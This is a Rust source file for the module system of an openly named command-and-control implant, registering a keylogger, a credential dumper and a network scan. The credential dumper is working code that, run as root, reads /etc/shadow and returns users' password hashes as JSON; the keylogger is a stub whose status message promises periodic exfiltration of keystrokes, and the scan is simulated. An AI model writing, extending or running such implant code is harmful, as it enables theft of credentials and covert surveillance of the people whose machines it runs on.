use async_trait::async_trait;
use serde_json::Value;
use log::{info, warn, error};
use std::collections::HashMap;
use std::sync::OnceLock;
use regex::Regex;
use nix::unistd::Uid;
use std::fs::File;
use std::io::{BufRead, BufReader};
use chrono::Utc;

macro_rules! json {
    ($($t:tt)*) => { serde_json::json!($($t)*) };
}

/// Standard interface for plugins
#[async_trait]
pub trait C2Module: Send + Sync {
    fn id(&self) -> &str;
    fn description(&self) -> &str;
    async fn execute(&self, args: Value) -> Result<Value, String>;
}

struct ModuleRegistry {
    modules: HashMap<String, Box<dyn C2Module>>,
}

impl ModuleRegistry {
    fn new() -> Self {
        let mut registry = ModuleRegistry { modules: HashMap::new() };
        registry.register(Box::new(KeyloggerModule));
        registry.register(Box::new(CredentialDumperModule));
        registry.register(Box::new(PingSweepModule));
        registry
    }

    fn register(&mut self, module: Box<dyn C2Module>) {
        let id = module.id().to_string();
        self.modules.insert(id.clone(), module);
        info!("Registered module: {}", id);
    }

    async fn execute_task(&self, task_id: &str, args: Value) -> Result<Value, String> {
        match self.modules.get(task_id) {
            Some(module) => module.execute(args).await,
            None => Err(format!("Unknown module ID: {}", task_id)),
        }
    }
}

static REGISTRY: OnceLock<ModuleRegistry> = OnceLock::new();

fn get_registry() -> &'static ModuleRegistry {
    REGISTRY.get_or_init(ModuleRegistry::new)
}

// --- MODULES ---

/// 1. Keylogger (Linux evdev placeholder)
struct KeyloggerModule;
#[async_trait]
impl C2Module for KeyloggerModule {
    fn id(&self) -> &str { "KEYLOG" }
    fn description(&self) -> &str { "Captures keystrokes via /dev/input/eventX" }

    async fn execute(&self, _args: Value) -> Result<Value, String> {
        if !Uid::current().is_root() {
            return Err("Error: Root privileges required to access /dev/input/event*".to_string());
        }

        info!("Initializing Keylogger thread on /dev/input/event*...");
        
        // In a full v1, this would spawn a tokio::spawn_blocking thread
        // that reads raw bytes from /dev/input/event* and decodes them.
        // For now, we return status.
        
        Ok(json!({
            "status": "initialized",
            "method": "evdev",
            "note": "Background thread active. Data will be buffered and exfiltrated periodically."
        }))
    }
}

/// 2. Real Credential Dumper (Linux /etc/shadow scan)
struct CredentialDumperModule;
#[async_trait]
impl C2Module for CredentialDumperModule {
    fn id(&self) -> &str { "DUMP_CREDS" }
    fn description(&self) -> &str { "Scans /etc/shadow and process memory" }

    async fn execute(&self, _args: Value) -> Result<Value, String> {
        if !Uid::current().is_root() {
            return Err("Error: Root privileges required to read /etc/shadow".to_string());
        }

        info!("Scanning /etc/shadow for credentials...");
        let mut found_creds: Vec<Value> = Vec::new();
        
        // Regex to match user:$hash$
        // Matches lines like: username:$6$randomsalt$hash:...
        let re = Regex::new(r"^([^:]+):(\$[a-z0-9\$]+\$[^:]+)").unwrap();

        match File::open("/etc/shadow") {
            Ok(file) => {
                let reader = BufReader::new(file);
                for line in reader.lines().flatten() {
                    if let Some(caps) = re.captures(&line) {
                        let user = caps.get(1).map(|m| m.as_str()).unwrap_or("");
                        let hash = caps.get(2).map(|m| m.as_str()).unwrap_or("");
                        
                        // Skip system accounts or empty hashes
                        if user != "root" && hash.len() > 10 && !hash.contains("!!") && !hash.contains("*") {
                            found_creds.push(json!({
                                "source": "/etc/shadow",
                                "user": user,
                                "type": "password_hash",
                                "hash": hash,
                                "scanned_at": Utc::now().to_rfc3339()
                            }));
                        }
                    }
                }
            },
            Err(e) => {
                error!("Failed to open /etc/shadow: {}", e);
                return Err("Failed to access credential store".to_string());
            }
        }

        if found_creds.is_empty() {
            warn!("No valid credentials found in /etc/shadow.");
            Ok(json!({
                "status": "no_creds_found",
                "scanned_at": Utc::now().to_rfc3339(),
                "note": "Ensure root permissions and check /etc/shadow contents."
            }))
        } else {
            Ok(json!({
                "status": "success",
                "count": found_creds.len(),
                "credentials": found_creds,
                "scanned_at": Utc::now().to_rfc3339()
            }))
        }
    }
}

/// 3. Network Scan (Simulated for brevity, logic remains same)
struct PingSweepModule;
#[async_trait]
impl C2Module for PingSweepModule {
    fn id(&self) -> &str { "NET_SCAN" }
    fn description(&self) -> &str { "Network discovery" }

    async fn execute(&self, args: Value) -> Result<Value, String> {
        let subnet = args.get("subnet").and_then(|v| v.as_str()).unwrap_or("192.168.1.0/24");
        info!("Scanning subnet: {}", subnet);
        
        // TODO: Implement real async ICMP ping here using tokio and pnet or similar
        
        Ok(json!({
            "status": "simulation_complete",
            "subnet": subnet,
            "hosts": ["192.168.1.1", "192.168.1.10"], // Placeholder
            "scanned_at": Utc::now().to_rfc3339()
        }))
    }
}

pub async fn run_module(task_id: &str, args: Value) -> Result<Value, String> {
    let registry = get_registry();
    registry.execute_task(task_id, args).await
}
